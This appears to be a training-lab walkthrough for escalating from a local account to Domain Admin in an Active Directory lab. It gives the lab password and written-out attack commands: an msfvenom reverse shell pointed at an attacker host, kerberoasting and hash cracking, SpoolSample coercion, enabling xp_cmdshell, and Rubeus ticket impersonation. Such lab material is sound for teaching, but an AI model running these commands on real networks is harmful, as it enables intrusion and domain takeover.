# 0. Starting Point

The context of this lab is that you are hired by a company in order to exploit any vulnerability there is on their Active Directory Infrastructure to become  Domain Admin. To do so, the company has provided some local account credentials for the machine "Krillin".

You can use Remote Desktop to log in to the machine as `.\auditor` with the password "PassW0rd".

Furthermore, there is a folder `C:\Tools` with most of the tools you need to exploit any vulnerability there is on the lab.

# 1. Vulnerable service 

1. Enumerate vulnerable services

```bash
.\SharpUp.exe audit ModifiableServiceBinaries
```

2. Because any local user has full control over the VulnService's folder and the service is stopped, it is possible to replace the file at `C:\\Program Files\\Vulnerable Service\\` for the one created with **msfvenom**.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe-service -o Service.exe
```

3. Then, restart the machine, and you should receive a reverse shell as `capsulecorp\vuln_svc`, granting access to the domain.

```bash
shutdown /r /t 0
```

# 2. Unconstrained delegation

As the user `capsulecorp\vuln_svc` perform the following steps.

1. Check if there is any machine with unconstrained delegation.

> The output should be the machine "RADITZ$".

```powershell
Import-Module C:\Tools\PowerView.ps1
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
```

2. In order to get access to the machine, we need to perform some kerberoasting.

```powershell
Import-Module C:\Tools\Invoke-Kerberoast.ps1
Invoke-Kerberoast -OutputFormat Hashcat  | % { $_.Hash } | Out-File -Encoding ASCII kerberoast_hashes.txt 
```

3. Crack the obtained tickets

```bash
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

4. Now you can access the RADITZ machine through RDP to the machine.
5. Obtain Goku's (DC) TGT using Rubeus. After executing the command, you will obtain the DC's TGT.

```powershell
# In one terminal
.\Rubeus.exe monitor /interval:10 /nowrap

# In other terminal
.\SpoolSample.exe goku raditz


 # These COMMAND DO NOT WORK :/
 certutil.exe -urlcache -f http://raditz.capsulecorp.local
 Invoke-WebRequest http://raditz.capsulecorp.local -UseDefaultCredentials -UseBasicParsing
```

# 2. Constrained delegation

1. The user `capsulecorp\vuln_svc` has access 

2. Obtain code execution on the machine through MSSQL

```powershell
Import-Module C:\Tools\PowerUpSQL.ps1
Get-SQLQuery -Instance "172.28.43.201,1433" -Query "select @@servername"
Get-SQLQuery -Instance "172.28.43.201,1433" -Query "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
Get-SQLQuery -Instance "172.28.43.201,1433" -Query "EXEC master.dbo.xp_cmdshell 'whoami';"
```

3. Once you have a proper reverse shell, extract the KRBTGT SQL_SVC ticket.

```powershell
.\Rubeus.exe  tgtdeleg /nowrap
```

3. Impersonate the user

```powershell
 .\Rubeus.exe s4u  /impersonateuser:administrator /domain:capsulecorp.local /msdsspn:cifs/goku.capsulecorp.local /dc:goku.capsulecorp.local  /nowrap /ptt /ticket:<DUMPED_TICKET>
```

4. Check that you have access to  the sahre `GOKU$\C$`

```powershell
dir \\goku.capsulecorp.local\c$
```

